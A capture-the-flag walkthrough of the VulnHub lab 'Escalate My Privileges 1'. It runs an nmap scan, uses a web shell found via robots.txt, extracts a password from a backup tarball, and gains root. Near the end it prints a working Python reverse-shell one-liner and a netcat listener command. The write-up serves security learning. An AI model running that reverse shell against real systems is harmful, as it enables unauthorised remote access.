# Escalate My Priveleges 1 (VulnHub)

We’re given an ip, and we start with an aggressive nmap scan

```bash
nmap -A *IP* -vv
```

Get’s us this output 

```bash
genghis@khan:~/Boxes/Privilege$ cat nmapscan.txt 
genghis@khan:~$ nmap -A 10.4.227.113 -vv 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 13:27 PDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
Initiating ARP Ping Scan at 13:27
Scanning 10.4.227.113 [1 port]
Completed ARP Ping Scan at 13:27, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:27
Completed Parallel DNS resolution of 1 host. at 13:27, 0.00s elapsed
Initiating SYN Stealth Scan at 13:27
Scanning my_privilege (10.4.227.113) [1000 ports]
Discovered open port 111/tcp on 10.4.227.113
Discovered open port 22/tcp on 10.4.227.113
Discovered open port 80/tcp on 10.4.227.113
Discovered open port 2049/tcp on 10.4.227.113
Completed SYN Stealth Scan at 13:27, 5.06s elapsed (1000 total ports)
Initiating Service scan at 13:27
Scanning 4 services on my_privilege (10.4.227.113)
Completed Service scan at 13:27, 6.03s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against my_privilege (10.4.227.113)
Retrying OS detection (try #2) against my_privilege (10.4.227.113)
NSE: Script scanning 10.4.227.113.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.46s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
Nmap scan report for my_privilege (10.4.227.113)
Host is up, received arp-response (0.00083s latency).
Scanned at 2025-09-19 13:27:15 PDT for 15s
Not shown: 986 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:16:10:91:bd:d7:6c:06:df:a2:b9:b5:b9:3b:dd:b6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZwfoUnj5DzMlbK5tY6JtH+GOCmEqaGPle3wxNVabnbYeAicg/35OHCZX9UNBfXHCkxrE4GuuF5dt6g70UyLNxI5iO9A4wnANDvlAfKNTq/qsQdpemYcYZSwQQLWdi8Qnno7BIR5gteI8+ZtLvFjsQ8LSJ5Hc5Lx9+lxxoZwvCJKC1UjIYaWHJPaFRQPdb2y57+63NcA/Gki5z2DRoKou4aVz1qsjwHZUlP6L5FgoZb75RbfQJe4NCY4+TGAVdstR1wgRYm7dpoHnzWQwEm8ocAekK7slUwah4brpA2u+MpmF3FVTai2+zfi02s4XbahY5/SGQeqtKj2cWfDvL0IyV
|   256 0e:a4:c9:fc:de:53:f6:1d:de:a9:de:e4:21:34:7d:1a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL6Wz1rv7fAEmPfOknHvjMFX3A3DB9/Mz9UpPQ3Zsb7lg8BwbTtlmh8e/HG70m6YeNAw+hqlWStW8gOBGSCI4h8=
|   256 ec:27:1e:42:65:1c:4a:3b:93:1c:a1:75:be:00:22:0d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ1zwLp8Vh7UFjPnbTrrL720yHvmHUKVq91Og4oHTJha
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: 400 Bad Request
111/tcp  open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      36758/tcp6  nlockmgr
|   100021  1,3,4      42186/tcp   nlockmgr
|   100021  1,3,4      51074/udp6  nlockmgr
|   100021  1,3,4      56981/udp   nlockmgr
|   100024  1          43350/tcp   status
|   100024  1          43419/udp6  status
|   100024  1          49114/udp   status
|   100024  1          53557/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl syn-ack ttl 64 3 (RPC #100227)
MAC Address: BC:24:11:F5:DC:E1 (Proxmox Server Solutions GmbH)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (97%), Linux 3.13 - 3.16 (91%), Linux 3.13 - 4.4 (91%), Linux 3.16 - 4.6 (91%), Linux 3.8 - 3.16 (91%), Linux 4.10 (91%), Linux 4.4 (91%), OpenWrt 19.07 (Linux 4.14) (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=9/19%OT=22%CT=%CU=%PV=Y%DS=1%DC=D%G=N%M=BC2411%TM=68CDBCB2%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10B%TI=Z%II=I%TS=A)
SEQ(SP=107%GCD=1%ISR=10A%TI=Z%TS=A)
OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.007 days (since Fri Sep 19 13:17:09 2025)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.83 ms my_privilege (10.4.227.113)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
           Raw packets sent: 2056 (94.060KB) | Rcvd: 43 (3.712KB)

```

Okay lots of interesting services running here. I thought I might as well start by connecting to the http server on port 80

![Screenshot_2025-09-19_13_59_46.png](Escalate%20My%20Priveleges%201%20(VulnHub)%20273559b52dc88097987fc090d68cc412/Screenshot_2025-09-19_13_59_46.png)

Okay seems like this silly little infographic is foreshadowing some privelege escalation in our near future!

As is usually standard protocol with these CTF challenges and http servers, i might as well check the robots.txt

![Screenshot_2025-09-19_14_03_27.png](Escalate%20My%20Priveleges%201%20(VulnHub)%20273559b52dc88097987fc090d68cc412/Screenshot_2025-09-19_14_03_27.png)

Okay it seems like they don’t want people looking at that directory, so that’s exactly where we’ll look!

Here’s what we find there…

![Screenshot_2025-09-19_14_07_07.png](Escalate%20My%20Priveleges%201%20(VulnHub)%20273559b52dc88097987fc090d68cc412/Screenshot_2025-09-19_14_07_07.png)

Okay sweet, it seems like we have a shell running in the browser with this user apache. Let’s check this readme.txt

```bash
apache@my_privilege:/var/www/html# cat readme.txt

HI
Find Armour User backup in /backup
```

Okay sweet! Sounds juicy, let’s head over there and see what’s going on.. 

![Screenshot_2025-09-19_15_02_14.png](Escalate%20My%20Priveleges%201%20(VulnHub)%20273559b52dc88097987fc090d68cc412/Screenshot_2025-09-19_15_02_14.png)

Okay there’s a bunch of backups, let’s see what’s in the latest backup?

```bash
apache@my_privilege:/backup/armour# tar -tzf /backup/armour/2025-09-19-17-20.tar.gz | head -n 50
home/armour/backup.sh
home/armour/Credentials.txt
home/armour/echo
home/armour/runme.sh
```

Bingo! It seems like there are some credentials here, let’s try to extract these files from the tarball

```bash
apache@my_privilege:/backup/armour# tar -xvzf 2025-09-19-17-20.tar.gz
home/armour/backup.sh
tar: home: Cannot mkdir: Permission denied
tar: home/armour/backup.sh: Cannot open: No such file or directory
home/armour/Credentials.txt
tar: home: Cannot mkdir: Permission denied
tar: home/armour/Credentials.txt: Cannot open: No such file or directory
home/armour/echo
tar: home: Cannot mkdir: Permission denied
tar: home/armour/echo: Cannot open: No such file or directory
home/armour/runme.sh
tar: home: Cannot mkdir: Permission denied
tar: home/armour/runme.sh: Cannot open: No such file or directory
tar: Exiting with failure status due to previous errors
```

Okay I’m running into some problems, it seems like I don’t have permissions to do this here, so I’ll make a directory in /tmp where we often have permissions to do these kinds of things even as a low-privilege user.

```bash
apache@my_privilege:/backup/armour# mkdir -p /tmp/armour
```

Now we’ll try to extract the files from the tarballs over there…

```bash
apache@my_privilege:/backup/armour# tar -xzf /backup/armour/2025-09-19-17-20.tar.gz -C /tmp/armour --strip-components=1
```

Seems like it worked, now let’s go over there and read these credentials!

```bash
apache@my_privilege:/tmp/armour/armour# cat Credentials.txt
my password is
md5(rootroot1)
```

Let’s go! Let’s try logging in as root here

```bash
apache@my_privilege:/tmp/armour/armour# sudo su root
sudo: sorry, you must have a tty to run sudo
```

I didn’t really expect that to work, but it seems like what’s stopping us from using the sudo command as that this web-terminal instance doesn’t have tty enabled. Let’s try spinning up a reverse shell that has tty enabled and see if we can log in as root there.

We’ll start by running our listener 

```bash
nc -lvnp 4444
```

Then inside of our webshell we type in the following reverse shell script

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

just fill in your IP where specified and run!

Bang! Now we’ve got our shell with tty enabled, and with the credentials we got getting root is as easy as entering the password! 

```bash
genghis@khan:~/Downloads$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.4.176.69] from (UNKNOWN) [10.4.227.113] 36610
bash-4.2$ su root
su root
Password: rootroot1

[root@my_privilege armour]# ls -l
ls -l
total 16
-rw-r--r-- 1 apache apache 30 Mar 21  2020 Credentials.txt
-rwxr-xr-x 1 apache apache 17 Mar 17  2020 backup.sh
-rw-r--r-- 1 apache apache 39 Sep 19 17:07 echo
-rwxr-xr-x 1 apache apache  8 Mar 17  2020 runme.sh
[root@my_privilege armour]# whoami
whoami
root
```